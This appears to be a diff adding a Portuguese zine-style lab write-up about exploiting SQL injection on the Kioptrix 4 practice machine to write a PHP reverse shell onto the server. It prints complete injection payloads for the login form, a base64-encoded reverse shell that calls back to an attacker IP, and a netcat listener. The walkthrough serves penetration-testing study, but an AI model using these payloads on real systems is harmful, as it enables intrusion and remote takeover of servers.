@@ -1,0 +1,169 @@
+<!doctype html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>SQLi(injection) com Reverse Shell no Kiotprix4 - OffensiveThink</title>
+  <link rel="stylesheet" href="../assets/zine.css">
+</head>
+<body class="article">
+<main class="page article-page">
+<pre>
+     SQLI(INJECTION) COM REVERSE SHELL NO KIOTPRIX4
+
+
+        ----------------------------------------------------------------
+        offensive think :: artigo técnico em formato zine / nfo
+        ----------------------------------------------------------------
+
+        titulo : SQLi(injection) com Reverse Shell no Kiotprix4
+        autor  : offensive think
+        data   : Thu, Jul 30, 2020
+        tags   : sqli
+
+        ----------------------------------------------------------------
+        --&gt; https://www.offensivethink.com/posts/sqli-kioptrix4.html &lt;--
+
+---[ INDEX ]------------------------------------------------------------
+0 - Preparando o ambiente
+1 - PRIMEIRO ATO! FORMA 1
+2 - SEGUNDO ATO! FORMA 2
+
+
+Este é um simples artigo só para mostrar algumas possibilidades que aprendi sobre como escrever arquivos em um servidor MySQL utilizando SQLi.
+Tudo passa pelo &quot;comando&quot; *INTO OUTFILE* no caso do MySQL.
+O que ele diz a grosso modo é : escreva o resultado desse SQL em um arquivo no filesystem. 😮😮😮😮😮😮😮. Pois é. Pois é. Pois é.
+Então, se temos uma possibilidade de SQLi e através dela podemos escrever arquivos no servidor, as possibilidades e a porta da esperança se abrem, concordam ?
+Para este artigo utilizaremos como base uma aplicação vulnerável a SQLinjection. *O formulário de login do LigGoat da máquina Kiotprix 4.*
+*Objetivo: *Escrever um script php que contenha o web shell reverso do pentest monkey, que já vem na distro Kali. Chamaremos o arquivo de meu-lindo-shell.php.
+
+
+---[ 0x00 - PREPARANDO O AMBIENTE ]-------------------------------------
+Dentro do Kali vamos copiar o webshell para nosso diretório raiz e customizar ele. Precisamos inserir qual é o nosso IP que esperamos receber o shell.
+
+    #Preparando nosso Web Shell
+    root@kbca$ locate webshell | grep revers
+    /usr/share/webshells/jsp/jsp-reverse.jsp
+    /usr/share/webshells/perl/perl-reverse-shell.pl
+    /usr/share/webshells/php/php-reverse-shell.php
+    
+    root@kbca$ cp /usr/share/webshells/php/php-reverse-shell.php meu-lindo-shell.php
+    
+    # &gt;&gt;&gt;&gt; Precisamos Substituir o IP e Porta &lt;&lt;&lt;&lt;
+    root@kbca$ grep -i &quot;CHANGE THIS&quot; meu-lindo-shell.php
+    $ip = &#x27;127.0.0.1&#x27;;  // CHANGE THIS
+    $port = 1234;       // CHANGE THIS
+    
+    # &gt;&gt;&gt;&gt; Usando o SED  &lt;&lt;&lt;&lt;&lt;&lt;&lt;
+    root@kbca$ sed -i -e &quot;s/127.0.0.1/192.168.200.3/g&quot; -e &quot;s/1234/443/g&quot; meu-lindo-shell.php
+     
+    root@kbca$ grep -i &quot;CHANGE THIS&quot; meu-lindo-shell.php
+    $ip = &#x27;192.168.200.3&#x27;;  // CHANGE THIS
+    $port = 443;       // CHANGE THIS
+
+_Opcionalmente recomendável_, vamos remover tudo que é comentário do nosso webshell. Por que ? Para economizar espaço. :D Com o comando abaixo tou pedindo para o sed remover (/d no final) tudo que começar com (ˆ) zero ou mais espaços (\s*) seguido de // (\/\/ — Parecem chifres mas são / &quot;escapadas&quot; \ pois a barra é caracter especial) , que é comentário do php.
+
+    $ sed  -i -e &#x27;/^\s*\/\//d&#x27; meu-lindo-shell.php
+
+
+
+---[ 0x01 - PRIMEIRO ATO! FORMA 1 ]-------------------------------------
+Bem, vamos a primeira forma, que é como o *SQLMap* faz! Ele se utiliza _&quot;da construção&quot; _*LINES TERMINATED BY*para inserir o conteúdo do arquivo desejado *em formato Hexadecimal*.
+Precisamos então converter nosso código para Hexa. Para isso podemos usar o excelente site canivete suíço CyberChef (https://gchq.github.io/CyberChef/) ou então direto na linha de comando com o xxd:
+
+    $ xxd -plain meu-lindo-shell.php &gt; meu-lindo-shell.hex
+
+Qual a construção utilizada no SQLi então ?
+&lt;sql injection&gt; LIMIT 0,1 *INTO OUTFILE* &#x27;&lt;nome-do-arquivo&gt;&#x27; *LINES TERMINATED BY* 0x&lt;seu-codigo-hexa-aqui&gt;-- -
+Como fica para o nosso caso ? No caso do Knoptrix 4 o campo vulnerável é o mypassword e existe um usuário de nome john.
+SQLi montado e pronto para ser injetado!
+
+    myusername=john&amp;mypassword=-9334&#x27; OR 1908=1908 LIMIT 0,1 INTO OUTFILE &#x27;/var/www/meu-lindo-shell.php&#x27; LINES TERMINATED BY 0x3c3f7068(... todo o resto do hexa aqui ...)-- -
+
+Para nos ajudar usaremos o *Repeater do Burp *conforme imagem abaixo. Vejam que estamos mandando para o _checklogin.php _todo o nosso SQLi.
+</pre>
+<a href="#?width=663" target="_blank"><img src="#?width=663"  ></a>
+<pre>
+Injetando tudo pelo Burp Suite
+Observe que o resultado é um erro ! 😮
+</pre>
+<a href="#?width=677" target="_blank"><img src="#?width=677"  ></a>
+<pre>
+Mas vamos testar! Localmente no kali, em um terminal:
+
+    root@kbca#nc -lnvp 433
+
+E no browser vamos chamar o nosso lindo shell.
+</pre>
+<a href="#?width=422" target="_blank"><img src="#?width=422"  ></a>
+<pre>
+E olha o que retorna no nosso Net Gatinho ;D
+</pre>
+<a href="#?width=700" target="_blank"><img src="#?width=700"  ></a>
+<pre>
+_Uma consideração em relação a esse método_.
+Pelo que andei lendo é necessário que o resultado do SQLi , ou seja, do select inicial traga algum resultado. Ele confia nisso e limita o resultado a apenas uma linha (limit 0,1). Caso o select não traga nenhum resultado, nada será escrito no arquivo e ele será criado com tamanho 0 bytes. A explicação para mim é que a instrução tá dizendo:
+*Outra consideração*.
+Como o select trará um resultado e inserirá o código que você passou em hexa ao final, fica evidente que o arquivo conterá _um &quot;lixo&quot; inicial_. Para scripts php isso não importa, afinal eles foram feitos para serem mesclados com texto puro que represente códigos html, por exemplo:
+
+    &lt;html&gt;
+       &lt;body&gt;
+          Olá &lt;?php echo $nome; ?&gt; , seja bem vindo(a)
+       &lt;/body&gt;
+    &lt;/html&gt;
+
+Observe como ficou o conteúdo do meu-lindo-shell.php no servidor. Olha o &quot;lixo&quot; na primeira linha correspondente ao resultado do select que a aplicação executou quando mandamos o SQLi:
+</pre>
+<a href="#?width=583" target="_blank"><img src="#?width=583"  ></a>
+<pre>
+
+
+---[ 0x02 - SEGUNDO ATO! FORMA 2 ]--------------------------------------
+Mas se você precisa que o arquivo não possua nenhum lixo inicial, pois isso pode gerar erro de interpretação do comando que o lerá, por exemplo, então teremos que usar outro método.
+Uma dificuldade desse método é que não dá para, por exemplo, colocar o código em hexadecimal como fizemos acima e ai precisaremos embutir o código em texto aberto direto no campo da instrução sql, e ai começam os problemas com abre e fechar aspas simples, duplas, etc.
+O que preciso fazer, qual será nosso &quot;payload&quot; do SQLi, qual será a instrução?
+&lt;seu sql injection&gt; limit 0,0 union all select &quot;&lt;codigo1&gt;&quot;,&quot;&lt;codigo2&gt;&quot;,&quot;&lt;codigo3&gt;&quot; *INTO OUTFILE *&#x27;&lt;nome-do-arquivo&gt;&#x27; -- -
+A diferença deste método para o anterior é que agora eu não quero nada que venha do select (limit 0,0) e com esse nada eu faço uma união para os campos que eu quero, ou seja, eu mesclo nada com o texto que eu quero que vá parar no arquivo. ;D
+Vocês podem se perguntar ? Porque três campos e não dois ou um, ou dez, ou duzentos ? Quando você faz uma união de tabelas (tabela que o sistema ta consultando nesse select mas a nossa &quot;tabela&quot; de , nesse caso, 3 campos) a quantidade de campos tem que ser exatas! E ainda, dependendo da versão do MySQL, pelo que me contaram, de tipo igual. Então, para o nosso caso exemplo, no kioptrix 4, são 3 campos.
+E eu preciso dividir o código em três campos ? Rapaz, precisa não. você pode colocar nada em um, tudo no meio, nada no final, ou nada, nada e tudo, e por ai vai.
+Mas bem, viu que preciso colocar o código php dentro de um destes campos que é delimitado por aspas duplas, correto ? Poderia ser simples ? poderia, tanto faz. Se pegarmos o código do web shell do pentest monkey, olha só:
+</pre>
+<a href="#?width=700" target="_blank"><img src="#?width=700"  ></a>
+<pre>
+Teria que modificar o código todo para tentar deixar só um tipo de aspas, fazer escape onde não puder, remover espaços e quebras de linha para ficar como se fosse uma linha única, para no final, colocar tudo dentro de um dos campos.
+Dureza. Masss podemos transformar todo esse código em base64 e usar as funções eval() e base64_decode() do php, para &quot;descriptografar&quot; o código e executá-lo on-the-fly ;D Marromenos assim:
+
+    &lt;?php eval(base64_decode(&#x27;&lt;codigo em base64&#x27;)); ?&gt;
+
+Por exigência da função eval, temos que elimiar o &lt;?php do início e o ?&gt; do final do script.
+</pre>
+<a href="#?width=679" target="_blank"><img src="#?width=679"  ></a>
+<pre>
+Depois é só usar o comando base64 e salvar o código gerado em algum lugar para usar na nossa instrução
+
+    # cat meu-lindo-shell.php | base64 -w
+
+Agora precisamos só juntar o SQL que iremos passar, com o código php que descriptografa e executa e o shell em base64, ficando assim :
+
+    myusername=john&amp;mypassword=-9334&#x27; OR 1908=1908 limit 0,0 union all select &quot;&lt;?php eval(base64_decode(&quot; , &quot;&#x27;c2V0X3RpbWVfbGltaXQgKDApOwokVkVSU0lPTiA9ICIxLjAiOwokaXAgPSAnMTkyLjE2OC4yMDAuMyc7ICAvLyBDSEFOR0UgVEhJUwokcG9ydCA9IDQ0MzsgICAgICAgLy8gQ0hBTkdFIFRISVMKJGNodW5rX3NpemUgPSAxNDAwOwokd3JpdGVfYSA9IG51bGw7CiRlcnJvcl9hID0gbnVsbDsKJHNoZWxsID0gJ3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7CiRkYWVtb24gPSAwOwokZGVidWcgPSAwOwoKCmlmIChmdW5jdGlvbl9leGlzdHMoJ3BjbnRsX2ZvcmsnKSkgewoJJHBpZCA9IHBjbnRsX2ZvcmsoKTsKCQoJaWYgKCRwaWQgPT0gLTEpIHsKCQlwcmludGl0KCJFUlJPUjogQ2FuJ3QgZm9yayIpOwoJCWV4aXQoMSk7Cgl9CgkKCWlmICgkcGlkKSB7CgkJZXhpdCgwKTsgIC8vIFBhcmVudCBleGl0cwoJfQoKCWlmIChwb3NpeF9zZXRzaWQoKSA9PSAtMSkgewoJCXByaW50aXQoIkVycm9yOiBDYW4ndCBzZXRzaWQoKSIpOwoJCWV4aXQoMSk7Cgl9CgoJJGRhZW1vbiA9IDE7Cn0gZWxzZSB7CglwcmludGl0KCJXQVJOSU5HOiBGYWlsZWQgdG8gZGFlbW9uaXNlLiAgVGhpcyBpcyBxdWl0ZSBjb21tb24gYW5kIG5vdCBmYXRhbC4iKTsKfQoKY2hkaXIoIi8iKTsKCnVtYXNrKDApOwoKCiRzb2NrID0gZnNvY2tvcGVuKCRpcCwgJHBvcnQsICRlcnJubywgJGVycnN0ciwgMzApOwppZiAoISRzb2NrKSB7CglwcmludGl0KCIkZXJyc3RyICgkZXJybm8pIik7CglleGl0KDEpOwp9CgokZGVzY3JpcHRvcnNwZWMgPSBhcnJheSgKICAgMCA9PiBhcnJheSgicGlwZSIsICJyIiksICAvLyBzdGRpbiBpcyBhIHBpcGUgdGhhdCB0aGUgY2hpbGQgd2lsbCByZWFkIGZyb20KICAgMSA9PiBhcnJheSgicGlwZSIsICJ3IiksICAvLyBzdGRvdXQgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KICAgMiA9PiBhcnJheSgicGlwZSIsICJ3IikgICAvLyBzdGRlcnIgaXMgYSBwaXBlIHRoYXQgdGhlIGNoaWxkIHdpbGwgd3JpdGUgdG8KKTsKCiRwcm9jZXNzID0gcHJvY19vcGVuKCRzaGVsbCwgJGRlc2NyaXB0b3JzcGVjLCAkcGlwZXMpOwoKaWYgKCFpc19yZXNvdXJjZSgkcHJvY2VzcykpIHsKCXByaW50aXQoIkVSUk9SOiBDYW4ndCBzcGF3biBzaGVsbCIpOwoJZXhpdCgxKTsKfQoKc3RyZWFtX3NldF9ibG9ja2luZygkcGlwZXNbMF0sIDApOwpzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwgMCk7CnN0cmVhbV9zZXRfYmxvY2tpbmcoJHBpcGVzWzJdLCAwKTsKc3RyZWFtX3NldF9ibG9ja2luZygkc29jaywgMCk7CgpwcmludGl0KCJTdWNjZXNzZnVsbHkgb3BlbmVkIHJldmVyc2Ugc2hlbGwgdG8gJGlwOiRwb3J0Iik7Cgp3aGlsZSAoMSkgewoJaWYgKGZlb2YoJHNvY2spKSB7CgkJcHJpbnRpdCgiRVJST1I6IFNoZWxsIGNvbm5lY3Rpb24gdGVybWluYXRlZCIpOwoJCWJyZWFrOwoJfQoKCWlmIChmZW9mKCRwaXBlc1sxXSkpIHsKCQlwcmludGl0KCJFUlJPUjogU2hlbGwgcHJvY2VzcyB0ZXJtaW5hdGVkIik7CgkJYnJlYWs7Cgl9CgoJJHJlYWRfYSA9IGFycmF5KCRzb2NrLCAkcGlwZXNbMV0sICRwaXBlc1syXSk7CgkkbnVtX2NoYW5nZWRfc29ja2V0cyA9IHN0cmVhbV9zZWxlY3QoJHJlYWRfYSwgJHdyaXRlX2EsICRlcnJvcl9hLCBudWxsKTsKCglpZiAoaW5fYXJyYXkoJHNvY2ssICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU09DSyBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHNvY2ssICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTT0NLOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHBpcGVzWzBdLCAkaW5wdXQpOwoJfQoKCWlmIChpbl9hcnJheSgkcGlwZXNbMV0sICRyZWFkX2EpKSB7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RET1VUIFJFQUQiKTsKCQkkaW5wdXQgPSBmcmVhZCgkcGlwZXNbMV0sICRjaHVua19zaXplKTsKCQlpZiAoJGRlYnVnKSBwcmludGl0KCJTVERPVVQ6ICRpbnB1dCIpOwoJCWZ3cml0ZSgkc29jaywgJGlucHV0KTsKCX0KCglpZiAoaW5fYXJyYXkoJHBpcGVzWzJdLCAkcmVhZF9hKSkgewoJCWlmICgkZGVidWcpIHByaW50aXQoIlNUREVSUiBSRUFEIik7CgkJJGlucHV0ID0gZnJlYWQoJHBpcGVzWzJdLCAkY2h1bmtfc2l6ZSk7CgkJaWYgKCRkZWJ1ZykgcHJpbnRpdCgiU1RERVJSOiAkaW5wdXQiKTsKCQlmd3JpdGUoJHNvY2ssICRpbnB1dCk7Cgl9Cn0KCmZjbG9zZSgkc29jayk7CmZjbG9zZSgkcGlwZXNbMF0pOwpmY2xvc2UoJHBpcGVzWzFdKTsKZmNsb3NlKCRwaXBlc1syXSk7CnByb2NfY2xvc2UoJHByb2Nlc3MpOwoKZnVuY3Rpb24gcHJpbnRpdCAoJHN0cmluZykgewoJaWYgKCEkZGFlbW9uKSB7CgkJcHJpbnQgIiRzdHJpbmdcbiI7Cgl9Cn0=&#x27;&quot; , &quot;));?&gt;&quot; INTO OUTFILE &#x27;/var/www/meu-lindo-shell.php&#x27;--%20-
+
+E ai , mandando pelo Burp , Colocando o nc para escutar, acessando o aquiro via browser, vmaos parar no mesmo lugar: _Shell no Net Gatinho_ ! ;D
+</pre>
+<a href="#?width=660" target="_blank"><img src="#?width=660"  ></a>
+<a href="#?width=700" target="_blank"><img src="#?width=700"  ></a>
+<pre>
+Massa, dá pra fazer também. Usa o Cyberchef em vez do base64 ou qualquer outra forma que você conhecer, converte para Hexa tudo e depois usa em vez da função *base64_decode() *a função *hex2bin()*.
+Ah, olha que interessante desta máquina:
+</pre>
+<a href="#?width=698" target="_blank"><img src="#?width=698"  ></a>
+<pre>
+O arquivo que subimos o usuário dele é root e o grupo root.
+Até.
+
+---[ EOF ]--------------------------------------------------------------
+
+                    offensive think / 2026
+</pre>
+</main>
+</body>
+</html>
